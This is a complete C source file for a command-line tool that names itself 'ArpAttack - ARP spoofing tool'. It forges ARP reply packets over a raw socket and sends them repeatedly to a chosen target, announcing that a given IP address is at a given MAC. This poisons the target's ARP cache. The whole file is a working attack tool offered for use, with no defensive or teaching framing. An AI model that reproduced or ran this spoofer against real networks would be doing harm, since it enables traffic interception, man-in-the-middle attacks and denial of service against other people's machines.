#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>

#include <getopt.h>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <net/if.h>
#include <netpacket/packet.h>

#define DEFAULT_TIME_STEP 2

enum RETURN_CODES {
	RETURN_OK,
	ERROR_CONNECT_SIGNAL,
	ERROR_CLI_ARGUMENTS,
	ERROR_PROCESS_INTERFACE,
	ERROR_PROCESS_ADDRESS,
	ERROR_OPEN_SOCKET,
};

void print_usage(void);
void clean(int signal);

int socket_fd;

int main(int argc, char* argv[]){

	int parsed_option;
	struct ether_addr dest_mac;
	struct ether_addr source_mac;
	struct in_addr dest_ip;
	struct in_addr source_ip;
	int interface;
	struct sockaddr_ll dest_addr;
	char* interface_str;
	char* dest_ip_str;
	char* dest_mac_str;
	char* source_ip_str;
	char* source_mac_str;
	int n_packets = 1;
	uint8_t infinite_loop = 1;
	int time_step = DEFAULT_TIME_STEP;
	int should_exit = 0;

	struct option long_options[] = {
		{"interface", required_argument, NULL, 'i'},
		{"dest_ip", required_argument, NULL, 'd'},
		{"dest_mac", required_argument, NULL, 'D'},
		{"source_ip", required_argument, NULL, 's'},
		{"source_mac", required_argument, NULL, 'S'},
		{"time_step", required_argument, NULL, 't'},
		{"n_packets", required_argument, NULL, 'n'},
		{"help", no_argument, NULL, 'h'},
	};

	while((parsed_option = getopt_long(argc, argv, "i:d:D:s:S:t:n:h", long_options, NULL)) != -1){
		switch(parsed_option){
			case 'i': interface_str = optarg; break;
			case 'd': dest_ip_str = optarg; break;
			case 'D': dest_mac_str = optarg; break;
			case 's': source_ip_str = optarg; break;
			case 'S': source_mac_str = optarg; break;
			case 't': time_step = atoi(optarg); break;
			case 'n': n_packets = atoi(optarg); infinite_loop = 0; break;
			case 'h':
			default:
					  print_usage(); exit(RETURN_OK);
		}
	}

	if(interface_str == NULL){
		fprintf(stderr, "Error: interface must be specified (--interface/-i <if>)\n");
		should_exit = 1;
	}
	if(dest_mac_str == NULL){
		fprintf(stderr, "Error: destination MAC must be specified (--dest_mac/-D <mac>)\n");
		should_exit = 1;
	}
	if(dest_ip_str == NULL){
		fprintf(stderr, "Error: destination IPv4 must be specified (--dest_ip/-d <ip>)\n");
		should_exit = 1;
	}
	if(source_mac_str == NULL){
		fprintf(stderr, "Error: source MAC must be specified (--source_mac/-S <mac>)\n");
		should_exit = 1;
	}
	if(source_ip_str == NULL){
		fprintf(stderr, "Error: source IPv4 must be specified (--source_ip/-s <ip>)\n");
		should_exit = 1;
	}
	if(should_exit){
		print_usage();
		exit(ERROR_CLI_ARGUMENTS);
	}

	if((interface = if_nametoindex(interface_str)) == 0){
		perror("Error: could not detect the interface");
		exit(ERROR_PROCESS_INTERFACE);
	}
	if((ether_aton_r(dest_mac_str, &dest_mac)) == NULL){
		fprintf(stderr, "Error: could not process MAC %s\n", dest_mac_str);
		exit(ERROR_PROCESS_ADDRESS);
	}
	if((ether_aton_r(source_mac_str, &source_mac)) == NULL){
		fprintf(stderr, "Error: could not process MAC %s\n", source_mac_str);
		exit(ERROR_PROCESS_ADDRESS);
	}
	if((inet_aton(dest_ip_str, &dest_ip)) == 0){
		fprintf(stderr, "Error: could not process IPv4 %s\n", dest_ip_str);
		exit(ERROR_PROCESS_ADDRESS);
	}
	if((inet_aton(source_ip_str, &source_ip)) == 0){
		fprintf(stderr, "Error: could not process IPv4 %s\n", source_ip_str);
		exit(ERROR_PROCESS_ADDRESS);
	}
	if(!infinite_loop){
		if(n_packets <= 0)
			n_packets = 1;
	}

	uint8_t buffer[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	struct ether_header* ether = (struct ether_header*)buffer;
	struct ether_arp* arp = (struct ether_arp*)(buffer + sizeof(struct ether_header));

	memcpy(&(ether->ether_dhost), &dest_mac, sizeof(ether->ether_dhost));
	memcpy(&(ether->ether_shost), &source_mac, sizeof(ether->ether_shost));
	ether->ether_type = htons(ETH_P_ARP);

	arp->arp_hrd = htons(ARPHRD_ETHER);
	arp->arp_pro = htons(ETH_P_IP);
	arp->arp_hln = ETH_ALEN;
	arp->arp_pln = sizeof(struct in_addr);
	arp->arp_op = htons(ARPOP_REPLY);
	memcpy(&(arp->arp_sha), &source_mac, sizeof(arp->arp_sha));
	memcpy(&(arp->arp_spa), &source_ip, sizeof(arp->arp_spa));
	memcpy(&(arp->arp_tha), &dest_mac, sizeof(arp->arp_tha));
	memcpy(&(arp->arp_tpa), &dest_ip, sizeof(arp->arp_tpa));

	memset(&dest_addr, 0x0, sizeof(struct sockaddr_ll));
	dest_addr.sll_family = AF_PACKET;
	dest_addr.sll_ifindex = interface;
	dest_addr.sll_halen = ETH_ALEN;
	dest_addr.sll_protocol = htons(ETH_P_ARP);
	memcpy(&(dest_addr.sll_addr), &dest_mac, sizeof(dest_addr.sll_addr));

	if((socket_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0){
		perror("Error: could not open socket");
		exit(ERROR_OPEN_SOCKET);
	}

	if(signal(SIGINT, clean) == SIG_ERR){
		perror("Error: could not connect signal SIGINT");
		clean(SIGINT);
		exit(ERROR_CONNECT_SIGNAL);
	}

	if(signal(SIGTERM, clean) == SIG_ERR){
		perror("Error: could not connect signal SIGTERM");
		clean(SIGTERM);
		exit(ERROR_CONNECT_SIGNAL);
	}

	while(n_packets--){
		if(sendto(socket_fd, &buffer, sizeof(buffer), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)))
			printf("Sending to %s [%s]: %s is at %s\n", dest_ip_str, dest_mac_str, source_ip_str, source_mac_str);

		if(infinite_loop)
			++n_packets;

		sleep(time_step);
	}

	return RETURN_OK;
}

void print_usage(void){
	printf("\n\t\t\tArpAttack - ARP spoofing tool\n\n[USAGE] arpattack -i <if> -d <ip> -D <mac> -s <ip> -S <mac>\n\n[OPTIONS]\n");
	printf("\t--interface (-i)\t\tName of the network interface\n");
	printf("\t--dest_ip (-d)\t\tIPv4 of the destination host\n");
	printf("\t--dest_mac (-D)\t\tMAC of the destination host\n");
	printf("\t--source_ip (-s)\t\tIPv4 of the source host\n");
	printf("\t--source_mac (-S)\t\tMAC of the source host\n");
	printf("\t--n_packets (-n)\t\tNumber of ARP packets to send. Default is infinite\n");
	printf("\t--time_step (-t)\t\tSeconds to wait between packet sent. Default is %i secs\n", DEFAULT_TIME_STEP);
	printf("\t--help (-h)\t\t\tPrints this help\n");
	printf("\n");
}

void clean(int signal){
	if(close(socket_fd))
		perror("Error: could not close socket");

	exit(RETURN_OK);
}










